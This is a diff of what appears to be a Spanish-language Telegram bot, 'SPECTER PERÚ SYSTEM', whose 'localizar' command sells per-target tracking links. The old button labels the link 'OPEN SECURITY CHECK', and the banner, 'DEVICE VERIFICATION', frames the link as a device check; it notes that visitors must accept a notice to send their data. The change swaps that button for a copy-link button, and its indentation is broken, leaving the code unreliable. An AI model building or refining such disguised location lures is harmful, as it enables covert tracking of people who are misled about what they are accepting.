@@ -957,10 +957,11 @@ def localizar_command(message):
         enlace = f"{PUBLIC_BASE_URL}/localizar/{token}"
 
         teclado = InlineKeyboardMarkup(row_width=1)
-        teclado.add(
-            InlineKeyboardButton(
-                "🔵 OPEN SECURITY CHECK",
-                url=enlace
+
+teclado.add(
+    InlineKeyboardButton(
+        text="📋 COPIAR ENLACE",
+        copy_text=CopyTextButton(text=enlace)
             )
         )
         teclado.add(
@@ -972,9 +973,9 @@ def localizar_command(message):
 
         saldo = get_creditos(user_id)
         texto = (
-            """╔══════════════╗
+            """╔═════════════════╗
 ║  SPECTER PERÚ SYSTEM  [1]  ║
-╚══════════════╝
+╚═══════════════════╝
 
 ┌─ 📡 DEVICE VERIFICATION ─┐
 │  STATUS: ONLINE
@@ -995,9 +996,6 @@ def localizar_command(message):
   [i] El visitante verá aviso en inglés
       y debe ACEPTAR para enviar datos.
 
-━━━━━━━━━━━━━━━
-  💠 COSTO: {COSTO_LOCALIZAR} CRD
-  🔋 SALDO RESTANTE: {saldo} CRD
 ━━━━━━━━━━━━━━━"""
         )
 
